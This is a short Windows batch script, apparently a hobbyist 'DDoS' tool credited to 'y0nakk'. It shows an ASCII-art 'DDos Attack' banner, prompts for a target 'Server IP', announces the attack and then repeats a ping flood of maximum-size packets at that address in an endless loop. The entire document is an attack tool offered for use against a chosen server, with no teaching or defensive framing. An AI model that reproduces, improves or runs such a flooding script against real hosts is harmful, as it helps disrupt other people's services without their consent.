@echo off
color 0a
mode 100,28
title DDos Destruction - y0nakk

:menu
cls
echo.
echo MM"""Yb. `7MM"""Yb.                               db     mm     mm                 `7MM      
echo MM    `Yb. MM    `Yb.                            ;MM:    MM     MM                   MM      
echo MM     `Mb MM     `Mb  ,pW"Wq.  ,pP"Ybd         ,V^MM.  mmMMmm mmMMmm,6"Yb.  ,p6"bo   MM  ,MP'
echo MM      MM MM      MM 6W'   `Wb 8I   `"        ,M  `MM   MM     MM  8)   MM 6M'  OO  MM ;Y   
echo MM     ,MP MM     ,MP 8M     M8 `YMMMa.        AbmmmqMA  MM     MM   ,pm9MM 8M       MM;Mm   
echo MM    ,dP' MM    ,dP' YA.   ,A9 L.   I8       A'     VML MM     MM  8M   MM YM.    , MM `Mb. 
echo JMMmmmdP' .JMMmmmdP'    `Ybmd9'  M9mmmP'     .AMA.   .AMMA`Mbmo  `Mbm`Moo9^Yo.YMbmd'.JMML. YA.
echo.
echo ----------------------------------------------------------------------------------------------
echo.
set /p input=Server IP: 
goto attack

:attack
cls
echo.
echo MM"""Yb. `7MM"""Yb.                               db     mm     mm                 `7MM      
echo MM    `Yb. MM    `Yb.                            ;MM:    MM     MM                   MM      
echo MM     `Mb MM     `Mb  ,pW"Wq.  ,pP"Ybd         ,V^MM.  mmMMmm mmMMmm,6"Yb.  ,p6"bo   MM  ,MP'
echo MM      MM MM      MM 6W'   `Wb 8I   `"        ,M  `MM   MM     MM  8)   MM 6M'  OO  MM ;Y   
echo MM     ,MP MM     ,MP 8M     M8 `YMMMa.        AbmmmqMA  MM     MM   ,pm9MM 8M       MM;Mm   
echo MM    ,dP' MM    ,dP' YA.   ,A9 L.   I8       A'     VML MM     MM  8M   MM YM.    , MM `Mb. 
echo JMMmmmdP' .JMMmmmdP'    `Ybmd9'  M9mmmP'     .AMA.   .AMMA`Mbmo  `Mbm`Moo9^Yo.YMbmd'.JMML. YA.
echo.
echo ----------------------------------------------------------------------------------------------
echo.
timeout /t 1 /nobreak >nul
echo STARTING DDOS ATTACK...
timeout /t 2 /nobreak >nul
goto loop

:loop
ping %input% -l 65500 -t -w 1 -n 1
goto loop
